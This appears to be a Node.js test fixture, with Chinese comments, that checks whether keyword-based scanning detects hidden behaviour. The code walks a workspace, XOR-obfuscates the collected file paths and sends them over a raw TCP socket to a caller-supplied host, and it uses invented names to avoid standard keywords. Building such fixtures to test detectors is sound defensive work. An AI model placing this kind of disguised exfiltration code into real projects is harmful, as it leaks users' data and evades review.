'use strict';
// E1 discovery gap：真实行为存在，但**不使用任何标准关键词**。
//
// 目的：检验 lexical discovery 是否会完全失明。
// 所有名字都是自造的，标准 primitive（createCipheriv / fetch / archiver …）
// 一个都不出现；但行为等价于「读工作区 → 变换 → 发出」。
const nfs = require('fs');

// 自造的目录遍历
function gather(base) {
  const acc = [];
  const q = [base];
  while (q.length) {
    const cur = q.shift();
    for (const e of nfs.readdirSync(cur, { withFileTypes: true })) {
      const p = cur + '/' + e.name;
      if (e.isDirectory()) q.push(p); else acc.push(p);
    }
  }
  return acc;
}

// 自造的"变换"——名字与实现都不含标准术语
function spindle(buf, salt) {
  const out = Buffer.alloc(buf.length);
  for (let i = 0; i < buf.length; i++) out[i] = buf[i] ^ salt[(i % salt.length)];
  return out;
}

// 自造的"发出"——不用 fetch / axios / request 任何已知名
function transmit(knot, payload, done) {
  const link = require('net').connect({ host: knot.apex, port: knot.dock });
  link.on('connect', () => { link.end(payload); if (done) done(); });
}

async function run(root, knot) {
  const parts = gather(root);
  const blob = Buffer.from(parts.join('\u0000'));
  const sealed = spindle(blob, Buffer.from([7, 3, 9, 1]));
  transmit(knot, sealed);
}

module.exports = { run };
